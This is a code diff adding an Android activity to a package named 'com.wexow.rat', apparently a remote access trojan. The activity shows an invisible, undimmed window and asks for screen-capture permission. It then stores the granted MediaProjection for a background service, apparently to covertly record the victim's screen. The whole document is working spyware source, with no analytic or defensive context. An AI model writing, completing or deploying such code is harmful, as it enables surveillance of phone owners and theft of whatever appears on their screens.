@@ -1,0 +1,59 @@
+package com.wexow.rat;
+
+import android.app.Activity;
+import android.content.Context;
+import android.content.Intent;
+import android.media.projection.MediaProjectionManager;
+import android.os.Build;
+import android.os.Bundle;
+import android.util.Log;
+
+import com.wexow.rat.managers.ScreenManager;
+
+public class ScreenCaptureProxyActivity extends Activity {
+    private static final String TAG = "ScreenCaptureProxy";
+    private static final int REQ = 1001;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        Log.e(TAG, "🚀 onCreate");
+
+        getWindow().setDimAmount(0f);
+
+        if (com.wexow.rat.core.MainService.getInstance() != null) {
+            com.wexow.rat.core.MainService.getInstance().upgradeForMediaProjection();
+        }
+
+        new android.os.Handler(android.os.Looper.getMainLooper())
+            .postDelayed(() -> requestPermission(), 300);
+    }
+
+    private void requestPermission() {
+        try {
+            MediaProjectionManager mpm = (MediaProjectionManager)
+                getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+            
+            if (mpm != null) {
+                Log.e(TAG, "🎯 Requesting MediaProjection");
+                startActivityForResult(mpm.createScreenCaptureIntent(), REQ);
+            } else {
+                finish();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "❌ " + e.getMessage(), e);
+            finish();
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int req, int result, Intent data) {
+        Log.e(TAG, "📥 result: " + result);
+        
+        if (req == REQ && result == RESULT_OK && data != null) {
+            ScreenManager.saveProjection(getApplicationContext(), result, data);
+            Log.e(TAG, "✅ MediaProjection saved");
+        }
+        finish();
+    }
+}
